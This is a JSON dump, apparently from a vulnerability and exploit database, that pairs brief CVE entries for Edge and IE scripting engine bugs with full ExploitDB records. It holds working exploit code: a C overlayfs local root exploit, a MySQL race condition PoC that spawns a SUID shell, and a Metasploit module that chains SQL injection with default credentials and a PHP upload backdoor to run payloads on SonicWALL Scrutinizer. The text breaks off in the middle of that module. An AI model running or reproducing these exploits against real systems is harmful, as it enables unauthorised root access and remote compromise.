                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102397
                ],
                "cve": [
                    "CVE-2018-0770"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0769",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102396
                ],
                "cve": [
                    "CVE-2018-0769"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0776",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102401
                ],
                "cve": [
                    "CVE-2018-0776"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0758",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102405
                ],
                "cve": [
                    "CVE-2018-0758"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0777",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102402
                ],
                "cve": [
                    "CVE-2018-0777"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0781",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, and CVE-2018-0778.",
                "osvdb": [],
                "bid": [
                    102404
                ],
                "cve": [
                    "CVE-2018-0781"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0772",
                "description": "Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 and R2 SP1, Windows 8.1 and Windows RT 8.1, Windows Server 2012 and R2, and Internet Explorer and Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102409
                ],
                "cve": [
                    "CVE-2018-0772"
                ],
                "msb": []
            },
            {
                "code": "/*\r\njust another overlayfs exploit, works on kernels before 2015-12-26\r\n\r\n# Exploit Title: overlayfs local root\r\n# Date: 2016-01-05\r\n# Exploit Author: rebel\r\n# Version: Ubuntu 14.04 LTS, 15.10 and more\r\n# Tested on: Ubuntu 14.04 LTS, 15.10\r\n# CVE : CVE-2015-8660\r\n\r\nblah@ubuntu:~$ id\r\nuid=1001(blah) gid=1001(blah) groups=1001(blah)\r\nblah@ubuntu:~$ uname -a && cat /etc/issue\r\nLinux ubuntu 3.19.0-42-generic #48~14.04.1-Ubuntu SMP Fri Dec 18 10:24:49 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\r\nUbuntu 14.04.3 LTS \\n \\l\r\nblah@ubuntu:~$ ./overlayfail\r\nroot@ubuntu:~# id\r\nuid=0(root) gid=1001(blah) groups=0(root),1001(blah)\r\n\r\n12/2015\r\nby rebel\r\n\r\n6354b4e23db225b565d79f226f2e49ec0fe1e19b\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <sched.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <sched.h>\r\n#include <sys/stat.h>\r\n#include <sys/types.h>\r\n#include <sys/mount.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <sched.h>\r\n#include <sys/stat.h>\r\n#include <sys/types.h>\r\n#include <sys/mount.h>\r\n#include <sys/types.h>\r\n#include <signal.h>\r\n#include <fcntl.h>\r\n#include <string.h>\r\n#include <linux/sched.h>\r\n#include <sys/wait.h>\r\n\r\nstatic char child_stack[1024*1024];\r\n\r\nstatic int\r\nchild_exec(void *stuff)\r\n{\r\n    system(\"rm -rf /tmp/haxhax\");\r\n    mkdir(\"/tmp/haxhax\", 0777);\r\n    mkdir(\"/tmp/haxhax/w\", 0777);\r\n    mkdir(\"/tmp/haxhax/u\",0777);\r\n    mkdir(\"/tmp/haxhax/o\",0777);\r\n\r\n    if (mount(\"overlay\", \"/tmp/haxhax/o\", \"overlay\", MS_MGC_VAL, \"lowerdir=/bin,upperdir=/tmp/haxhax/u,workdir=/tmp/haxhax/w\") != 0) {\r\n\tfprintf(stderr,\"mount failed..\\n\");\r\n    }\r\n\r\n    chmod(\"/tmp/haxhax/w/work\",0777);\r\n    chdir(\"/tmp/haxhax/o\");\r\n    chmod(\"bash\",04755);\r\n    chdir(\"/\");\r\n    umount(\"/tmp/haxhax/o\");\r\n    return 0;\r\n}\r\n\r\nint\r\nmain(int argc, char **argv)\r\n{\r\n    int status;\r\n    pid_t wrapper, init;\r\n    int clone_flags = CLONE_NEWNS | SIGCHLD;\r\n    struct stat s;\r\n\r\n    if((wrapper = fork()) == 0) {\r\n        if(unshare(CLONE_NEWUSER) != 0)\r\n            fprintf(stderr, \"failed to create new user namespace\\n\");\r\n\r\n        if((init = fork()) == 0) {\r\n            pid_t pid =\r\n                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);\r\n            if(pid < 0) {\r\n                fprintf(stderr, \"failed to create new mount namespace\\n\");\r\n                exit(-1);\r\n            }\r\n\r\n            waitpid(pid, &status, 0);\r\n\r\n        }\r\n\r\n        waitpid(init, &status, 0);\r\n        return 0;\r\n    }\r\n\r\n    usleep(300000);\r\n\r\n    wait(NULL);\r\n\r\n    stat(\"/tmp/haxhax/u/bash\",&s);\r\n\r\n    if(s.st_mode == 0x89ed)\r\n        execl(\"/tmp/haxhax/u/bash\",\"bash\",\"-p\",\"-c\",\"rm -rf /tmp/haxhax;python -c \\\"import os;os.setresuid(0,0,0);os.execl('/bin/bash','bash');\\\"\",NULL);\r\n\r\n    fprintf(stderr,\"couldn't create suid :(\\n\");\r\n    return -1;\r\n}",
                "description": "Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1)",
                "author": "rebel",
                "_id": 39166,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2016-01-05T00:00:00+00:00",
                "cve": [
                    "CVE-2015-8660"
                ],
                "type": "local",
                "port": 0
            },
            {
                "source": "CVE",
                "_id": "2018-0762",
                "description": "Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 and R2 SP1, Windows 8.1 and Windows RT 8.1, Windows Server 2012 and R2, and Internet Explorer and Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102408
                ],
                "cve": [
                    "CVE-2018-0762"
                ],
                "msb": []
            },
            {
                "code": "/*\r\n\r\nSource: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html // http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c\r\n\r\nMySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit\r\nmysql-privesc-race.c (ver. 1.0)\r\n\r\nCVE-2016-6663 / OCVE-2016-5616\r\n\r\nDiscovered/Coded by:\r\n\r\nDawid Golunski\r\ndawid[at]legalhackers.com\r\nhttps://legalhackers.com\r\n\r\nFollow https://twitter.com/dawid_golunski for updates on this advisory.\r\n\r\n\r\nCompile:\r\ngcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient\r\n\r\nNote:\r\n* On RedHat-based systems you might need to change /tmp to another public directory (e.g. /uploads)\r\n\r\n* For testing purposes only. Do no harm.  \r\n\r\nFull advisory URL:\r\nhttps://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html\r\n\r\nVideo PoC:\r\nhttps://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html\r\n\r\n*/\r\n\r\n\r\n#include <fcntl.h>\r\n#include <grp.h>\r\n#include <mysql.h>\r\n#include <pwd.h>\r\n#include <stdint.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <sys/inotify.h>\r\n#include <sys/stat.h>\r\n#include <sys/types.h>\r\n#include <sys/wait.h>\r\n#include <time.h>\r\n#include <unistd.h>\r\n\r\n\r\n#define EXP_PATH          \"/tmp/mysql_privesc_exploit\"\r\n#define EXP_DIRN          \"mysql_privesc_exploit\"\r\n#define MYSQL_TAB_FILE    EXP_PATH \"/exploit_table.MYD\"\r\n#define MYSQL_TEMP_FILE   EXP_PATH \"/exploit_table.TMD\"\r\n\r\n#define SUID_SHELL   \t  EXP_PATH \"/mysql_suid_shell.MYD\"\r\n\r\n#define MAX_DELAY 1000    // can be used in the race to adjust the timing if necessary\r\n\r\nMYSQL *conn;\t\t  // DB handles\r\nMYSQL_RES *res;\r\nMYSQL_ROW row;\r\n\r\nunsigned long cnt;\r\n\r\n\r\nvoid intro() {\r\n\r\nprintf( \r\n        \"\\033[94m\\n\"\r\n        \"MySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit\\n\"\r\n        \"mysql-privesc-race.c (ver. 1.0)\\n\\n\"\r\n        \"CVE-2016-6663 / OCVE-2016-5616\\n\\n\"\r\n        \"For testing purposes only. Do no harm.\\n\\n\"\r\n\t\"Discovered/Coded by:\\n\\n\"\r\n\t\"Dawid Golunski \\n\"\r\n\t\"http://legalhackers.com\"\r\n        \"\\033[0m\\n\\n\");\r\n\r\n}\r\n\r\nvoid usage(char *argv0) {\r\n    intro();\r\n    printf(\"Usage:\\n\\n%s user pass db_host database\\n\\n\", argv0);\r\n}\r\n\r\nvoid mysql_cmd(char *sql_cmd, int silent) {\r\n    \r\n    if (!silent) {\r\n\t    printf(\"%s \\n\", sql_cmd);\r\n    }\r\n    if (mysql_query(conn, sql_cmd)) {\r\n        fprintf(stderr, \"%s\\n\", mysql_error(conn));\r\n        exit(1);\r\n    }\r\n    res = mysql_store_result(conn);\r\n    if (res>0) mysql_free_result(res);\r\n\r\n}\r\n\r\n\r\nint main(int argc,char **argv)\r\n{\r\n\r\n    int randomnum = 0;\r\n    int io_notified = 0;\r\n    int myd_handle;\r\n    int wpid;\r\n    int is_shell_suid=0;\r\n    pid_t pid;\r\n    int status;\r\n    struct stat st;\r\n    /* io notify */\r\n    int fd;\r\n    int ret;\r\n    char buf[4096] __attribute__((aligned(8)));\r\n    int num_read;\r\n    struct inotify_event *event;\r\n    /* credentials */\r\n    char *user     = argv[1];\r\n    char *password = argv[2];\r\n    char *db_host  = argv[3];\r\n    char *database = argv[4];\r\n\r\n\r\n    // Disable buffering of stdout\r\n    setvbuf(stdout, NULL, _IONBF, 0);\r\n\r\n    // Get the params\r\n    if (argc!=5) {\r\n\tusage(argv[0]);\r\n\texit(1);\r\n    } \r\n    intro();\r\n    // Show initial privileges\r\n    printf(\"\\n[+] Starting the exploit as: \\n\");\r\n    system(\"id\");\r\n\r\n    // Connect to the database server with provided credentials\r\n    printf(\"\\n[+] Connecting to the database `%s` as %s@%s\\n\", database, user, db_host);\r\n    conn = mysql_init(NULL);\r\n    if (!mysql_real_connect(conn, db_host, user, password, database, 0, NULL, 0)) {\r\n        fprintf(stderr, \"%s\\n\", mysql_error(conn));\r\n        exit(1);\r\n    }\r\n\r\n    // Prepare tmp dir\r\n    printf(\"\\n[+] Creating exploit temp directory %s\\n\", \"/tmp/\" EXP_DIRN);\r\n    umask(000);\r\n    system(\"rm -rf /tmp/\" EXP_DIRN \" && mkdir /tmp/\" EXP_DIRN);\r\n    system(\"chmod g+s /tmp/\" EXP_DIRN );\r\n\r\n    // Prepare exploit tables :)\r\n    printf(\"\\n[+] Creating mysql tables \\n\\n\");\r\n    mysql_cmd(\"DROP TABLE IF EXISTS exploit_table\", 0);\r\n    mysql_cmd(\"DROP TABLE IF EXISTS mysql_suid_shell\", 0);\r\n    mysql_cmd(\"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '\" EXP_PATH \"'\", 0);\r\n    mysql_cmd(\"CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '\" EXP_PATH \"'\", 0);\r\n\r\n    // Copy /bin/bash into the mysql_suid_shell.MYD mysql table file\r\n    // The file should be owned by mysql:attacker thanks to the sticky bit on the table directory\r\n    printf(\"\\n[+] Copying bash into the mysql_suid_shell table.\\n    After the exploitation the following file/table will be assigned SUID and executable bits : \\n\");\r\n    system(\"cp /bin/bash \" SUID_SHELL);\r\n    system(\"ls -l \" SUID_SHELL);\r\n\r\n    // Use inotify to get the timing right\r\n    fd = inotify_init();\r\n    if (fd < 0) {\r\n        printf(\"failed to inotify_init\\n\");\r\n        return -1;\r\n    }\r\n    ret = inotify_add_watch(fd, EXP_PATH, IN_CREATE | IN_CLOSE);\r\n\r\n\r\n    /* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */\r\n\r\n    printf(\"\\n[+] Entering the race loop... Hang in there...\\n\");\r\n\r\n    while ( is_shell_suid != 1 ) {\r\n\r\n        cnt++;\r\n\tif ( (cnt % 100) == 0 ) {\r\n\t \tprintf(\"->\");\r\n\t \t//fflush(stdout);\t\r\n\t}\r\n\r\n        /* Create empty file , remove if already exists */\r\n        unlink(MYSQL_TEMP_FILE);\r\n        unlink(MYSQL_TAB_FILE);\r\n   \tmysql_cmd(\"DROP TABLE IF EXISTS exploit_table\", 1);\r\n\tmysql_cmd(\"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '\" EXP_PATH \"'\", 1);\r\n\r\n\t/* random num if needed */\r\n        srand ( time(NULL) );\r\n        randomnum = ( rand() % MAX_DELAY );\r\n\r\n        // Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink\r\n        pid = fork();\r\n        if (pid < 0) {\r\n            fprintf(stderr, \"Fork failed :(\\n\");\r\n        }\r\n\r\n        /* Child process - executes REPAIR TABLE  SQL statement */\r\n        if (pid == 0) {\r\n            usleep(500);\r\n            unlink(MYSQL_TEMP_FILE);\r\n\t    mysql_cmd(\"REPAIR TABLE exploit_table EXTENDED\", 1);\r\n            // child stops here\r\n            exit(0);\r\n        }\r\n\r\n        /* Parent process - aims to replace the temp .tmd table with a symlink before chmod */\r\n        if (pid > 0 ) {\r\n            io_notified = 0;\r\n\r\n            while (1) {\r\n                int processed = 0;\r\n                ret = read(fd, buf, sizeof(buf));\r\n                if (ret < 0) {\r\n                    break;\r\n                }\r\n                while (processed < ret) {\r\n                    event = (struct inotify_event *)(buf + processed);\r\n                    if (event->mask & IN_CLOSE) {\r\n                        if (!strcmp(event->name, \"exploit_table.TMD\")) {\r\n                            //usleep(randomnum);\r\n\r\n\t\t\t    // Set the .MYD permissions to suid+exec before they get copied to the .TMD file \r\n\t\t\t    unlink(MYSQL_TAB_FILE);\r\n\t\t\t    myd_handle = open(MYSQL_TAB_FILE, O_CREAT, 0777);\r\n\t\t\t    close(myd_handle);\r\n\t\t\t    chmod(MYSQL_TAB_FILE, 04777);\r\n\r\n\t\t\t    // Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec\r\n                            unlink(MYSQL_TEMP_FILE);\r\n                            symlink(SUID_SHELL, MYSQL_TEMP_FILE);\r\n                            io_notified=1;\r\n                        }\r\n                    }\r\n                    processed += sizeof(struct inotify_event);\r\n                }\r\n                if (io_notified) {\r\n                    break;\r\n                }\r\n            }\r\n\r\n\r\n            waitpid(pid, &status, 0);\r\n        }\r\n\r\n\t// Check if SUID bit was set at the end of this attempt\r\n        if ( lstat(SUID_SHELL, &st) == 0 ) {\r\n\t    if (st.st_mode & S_ISUID) {\r\n\t\tis_shell_suid = 1;\r\n\t    }\r\n        } \r\n\r\n    }\r\n\r\n    printf(\"\\n\\n[+] \\033[94mBingo! Race won (took %lu tries) !\\033[0m Check out the \\033[94mmysql SUID shell\\033[0m: \\n\\n\", cnt);\r\n    system(\"ls -l \" SUID_SHELL);\r\n\r\n    printf(\"\\n[+] Spawning the \\033[94mmysql SUID shell\\033[0m now... \\n    Remember that from there you can gain \\033[1;31mroot\\033[0m with vuln \\033[1;31mCVE-2016-6662\\033[0m or \\033[1;31mCVE-2016-6664\\033[0m :)\\n\\n\");\r\n    system(SUID_SHELL \" -p -i \");\r\n    //system(SUID_SHELL \" -p -c '/bin/bash -i -p'\");\r\n\r\n    /* close MySQL connection and exit */\r\n    printf(\"\\n[+] Job done. Exiting\\n\\n\");\r\n    mysql_close(conn);\r\n    return 0;\r\n\r\n}",
                "description": "MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysql' System User Privilege Escalation / Race Condition",
                "author": "Dawid Golunski",
                "_id": 40678,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2016-11-01T00:00:00+00:00",
                "cve": [
                    "CVE-2016-6663",
                    "CVE-2016-5616",
                    "CVE-2016-6662",
                    "CVE-2016-6664"
                ],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = ExcellentRanking\r\n\r\n  include Msf::Exploit::Remote::HttpClient\r\n  include Msf::Exploit::FileDropper\r\n  include Msf::Exploit::EXE\r\n\r\n  WINDOWS = /^win/i\r\n  LINUX   = /linux/i\r\n\r\n  def initialize(info={})\r\n    super(update_info(info,\r\n      'Name'           => \"Dell SonicWALL Scrutinizer 11.01 methodDetail SQL Injection\",\r\n      'Description'    => %q{\r\n        This module exploits a vulnerability found in Dell SonicWALL Scrutinizer. The methodDetail\r\n        parameter in exporters.php allows an attacker to write arbitrary files to the file system\r\n        with an SQL Injection attack, and gain remote code execution under the context of SYSTEM\r\n        for Windows, or as Apache for Linux.\r\n\r\n        Authentication is required to exploit this vulnerability, but this module uses\r\n        the default admin:admin credential.\r\n      },\r\n      'License'        => MSF_LICENSE,\r\n      'Author'         =>\r\n        [\r\n          'bperry', # Original discovery, PoC, and Metasploit module\r\n          'sinn3r'  # Metasploit module for native support\r\n        ],\r\n      'References'     =>\r\n        [\r\n          [ 'CVE', '2014-4977' ],\r\n          [ 'BID', '68495' ],\r\n          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Jul/44' ],\r\n          [ 'URL','https://gist.github.com/brandonprry/76741d9a0d4f518fe297' ]\r\n        ],\r\n      'Arch'           => [ ARCH_X86 ],\r\n      'Platform'       => [ 'win', 'linux' ],\r\n      'Targets'        =>\r\n        [\r\n          [ 'Automatic', {} ],\r\n          [\r\n            'Dell SonicWALL Scrutinizer 11.01 on Windows',\r\n            {\r\n              'Arch'     => ARCH_X86,\r\n              'Platform' => 'win',\r\n            }\r\n          ],\r\n          [\r\n            'Dell SonicWALL Scrutinizer 11.01 Linux Appliance',\r\n            {\r\n              'Arch'     => ARCH_X86,\r\n              'Platform' => 'linux'\r\n            }\r\n          ]\r\n        ],\r\n      'Privileged'     => false,\r\n      'DisclosureDate' => 'Jul 24 2014',\r\n      'DefaultTarget'  => 0))\r\n\r\n    register_options(\r\n      [\r\n        OptString.new('TARGETURI', [ true, \"Base Application path\", \"/\" ]),\r\n        OptString.new('USERNAME', [ true,  'The username to authenticate as', 'admin' ]),\r\n        OptString.new('PASSWORD', [ true,  'The password to authenticate with', 'admin' ])\r\n      ], self.class)\r\n  end\r\n\r\n\r\n  # Prints a message with the target's IP and port.\r\n  #\r\n  # @param msg [String] Message to print.\r\n  # @return [void]\r\n  def print_status(msg='')\r\n    super(\"#{peer} - #{msg}\")\r\n  end\r\n\r\n\r\n  # Prints an error message with the target's IP and port.\r\n  #\r\n  # @param msg [String] Message to print.\r\n  # @return [void]\r\n  def print_error(msg='')\r\n    super(\"#{peer} - #{msg}\")\r\n  end\r\n\r\n\r\n  # Pads NULL columns for a SQL injection string.\r\n  #\r\n  # @param n [Fixnum] Number of nulls\r\n  # @return [String]\r\n  def pad_null(n)\r\n    padding = []\r\n\r\n    n.times do\r\n      padding << 'NULL'\r\n    end\r\n\r\n    padding * ','\r\n  end\r\n\r\n\r\n  # Checks (explicitly) the target for the vulnerability. To be able to check this, a\r\n  # valid username/password is required.\r\n  #\r\n  # @return [void]\r\n  def check\r\n    begin\r\n      res = do_login\r\n    rescue Msf::Exploit::Failed => e\r\n      vprint_error(e.message)\r\n      return Exploit::CheckCode::Unknown\r\n    end\r\n\r\n    uid = res['userid']\r\n    sid = res['sessionid']\r\n    pattern = Rex::Text.rand_text_alpha(10)\r\n    sqli_str = \"-6045 UNION ALL SELECT '#{pattern}',#{pad_null(19)}\"\r\n    res = do_sqli(sqli_str, sid, uid).get_json_document\r\n    return Exploit::CheckCode::Vulnerable if res['id'].to_s == pattern\r\n\r\n    Exploit::CheckCode::Safe\r\n  end\r\n\r\n\r\n  # Returns the OS information by using @@version_compile_os.\r\n  #\r\n  # @param sid [String] Session ID.\r\n  # @param uid [String] User ID.\r\n  # @return [String] The OS information.\r\n  def get_os(sid, uid)\r\n    sqli_str = \"-6045 UNION ALL SELECT @@version_compile_os,#{pad_null(19)}\"\r\n    res = do_sqli(sqli_str, sid, uid).get_json_document\r\n    res['id']\r\n  end\r\n\r\n\r\n  # Returns target's d4d directory path that will be used to upload our malicious files.\r\n  #\r\n  # @param os [String] OS information.\r\n  # @return [String]\r\n  def get_d4d_path(os)\r\n    case os\r\n    when WINDOWS\r\n      # On Windows, the full d4d path looks something like this:\r\n      # C:\\Program Files\\Scrutinizer\\html\\d4d\r\n      '../../html/d4d'\r\n    when LINUX\r\n      # On the Linux appliance, the d4d path looks exactly like this:\r\n      '/home/plixer/scrutinizer/html/d4d'\r\n    end\r\n  end\r\n\r\n\r\n  # Logs into Dell SonicWALL Scrutinizer.\r\n  #\r\n  # @return [Hash] JSON response.\r\n  def do_login\r\n    res = send_request_cgi({\r\n      'uri' => normalize_uri(target_uri, '/cgi-bin/login.cgi'),\r\n      'vars_get' => {\r\n        'name' => datastore['USERNAME'],\r\n        'pwd' => datastore['PASSWORD']\r\n      }\r\n    })\r\n\r\n    unless res\r\n      fail_with(Failure::Unknown, 'The connection timed out while attempting to log in.')\r\n    end\r\n\r\n    res = res.get_json_document\r\n\r\n    if res['noldapnouser']\r\n      fail_with(Failure::NoAccess, \"Username '#{datastore['USERNAME']}' is incorrect.\")\r\n    elsif res['loginfailed']\r\n      fail_with(Failure::NoAccess, \"Password '#{datastore['PASSWORD']}' is incorrect.\")\r\n    end\r\n\r\n    report_cred(datastore['USERNAME'], datastore['PASSWORD'])\r\n\r\n    res\r\n  end\r\n\r\n\r\n  # Saves a valid username/password to database.\r\n  #\r\n  # @param username [String]\r\n  # @param password [String]\r\n  # @return [void]\r\n  def report_cred(username, password)\r\n    service_data = {\r\n      address: rhost,\r\n      port: rport,\r\n      service_name: ssl ? 'https' : 'http',\r\n      protocol: 'tcp',\r\n      workspace_id: myworkspace_id\r\n    }\r\n\r\n    credential_data = {\r\n      module_fullname: self.fullname,\r\n      origin_type: :service,\r\n      username: username,\r\n      private_data: password,\r\n      private_type: :password\r\n    }.merge(service_data)\r\n\r\n    credential_core = create_credential(credential_data)\r\n\r\n    login_data = {\r\n      core: credential_core,\r\n      last_attempted_at: DateTime.now,\r\n      status: Metasploit::Model::Login::Status::SUCCESSFUL\r\n    }.merge(service_data)\r\n\r\n    create_credential_login(login_data)\r\n  end\r\n\r\n\r\n  # Injects malicious SQL string to the methodDetail parameter against the target machine.\r\n  #\r\n  # @param method_detail [String] Malicious SQL injection string.\r\n  # @param sid [String] Session ID.\r\n  # @param uid [String] User ID.\r\n  # @return [Rex::Proto::Http::Response]\r\n  def do_sqli(method_detail, sid, uid)\r\n    res = send_request_cgi({\r\n      'uri'      => normalize_uri(target_uri, '/d4d/exporters.php'),\r\n      'vars_get' => { 'methodDetail'=> method_detail },\r\n      'cookie'   => \"cookiesenabled=1;sessionid=#{sid};userid=#{uid}\"\r\n    })\r\n\r\n    unless res\r\n      fail_with(Failure::Unknown, 'The connection timed out for exporters.php.')\r\n    end\r\n\r\n    res\r\n  end\r\n\r\n\r\n  # Returns a PHP backdoor that is to be uploaded onto the target machine.\r\n  #\r\n  # @param os [String] Target OS information.\r\n  # @param target_path [String]\r\n  # @return [String] PHP backdoor\r\n  def get_php_backdoor(os)\r\n    case os\r\n    when WINDOWS\r\n      chmod_code = %Q|chmod($bname, 0777);|\r\n      exec_code = %Q|exec($bname);|\r\n    when LINUX\r\n      chmod_code = %Q|chmod(\"./\" . $bname, 0777);|\r\n      exec_code = %Q|exec(\"./\" . $bname);|\r\n    end\r\n\r\n    %Q|<?php\r\n    $bname = basename( $_FILES['uploadedfile']['name']);\r\n    $target_path = \"./\" . $bname;\r\n    move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path);\r\n    #{chmod_code}\r\n    #{exec_code}\r\n    ?>\r\n    |.gsub(/\\x20{4}/, ' ')\r\n  end\r\n\r\n\r\n  # Uploads the executable payload via malicious PHP backdoor.\r\n  #\r\n  # @param backdoor_fname [String] Name of the backdoor\r\n  # @param payload_fname [String] Name of the executable payload\r\n  # @return [void]\r\n  def upload_payload(backdoor_fname, payload_fname)\r\n    p = generate_payload_exe(\r\n      code: payload.encoded,\r\n      platform: @my_target.platform,\r\n      arch: @my_target.arch\r\n    )\r\n\r\n    print_status(\"Uploading #{payload_fname} (#{p.length} bytes)...\")\r\n\r\n    post_data = Rex::MIME::Message.new\r\n    post_data.add_part(\r\n      p,\r\n      'application/octet-stream',\r\n      'binary',\r\n      \"form-data; name=\\\"uploadedfile\\\"; filename=\\\"#{payload_fname}\\\"\"\r\n    )\r\n    data = post_data.to_s\r\n\r\n    res = send_request_cgi({\r\n      'method' => 'POST',\r\n      'uri'    => normalize_uri(target_uri, \"/d4d/#{backdoor_fname}\"),\r\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\r\n      'data'   => data\r\n    })\r\n\r\n    unless res\r\n      # Here we are not using fail_with, because when we get a session, it seems to be creating\r\n      # the same effect as connection hanging... and then eventually times out. If that\r\n      # happens, a fail_with() can cause msfconsole to believe there is no session created.\r\n      vprint_status('Connection timed out while uploading payload.')\r\n      return\r\n    end\r\n\r\n    if res.code == 404\r\n      fail_with(Failure::Unknown, \"Server returned 404 for #{backdoor_fname}.\")\r\n    end\r\n  end\r\n\r\n\r\n  # Uploads the PHP backdoor onto the target machine. The reason of using a PHP backdoor to upload\r\n  # is because our SQL injection is in a GET method, and Apache has a max length of 8190 bytes,\r\n  # which is bad for some built-in or custom payloads.\r\n  #\r\n  # @param opts [Hash]\r\n  # @option opts [String] :d4d_path\r\n  # @option opts [String] :backdoor_fname\r\n  # @option opts [String] :payload_fname\r\n  # @option 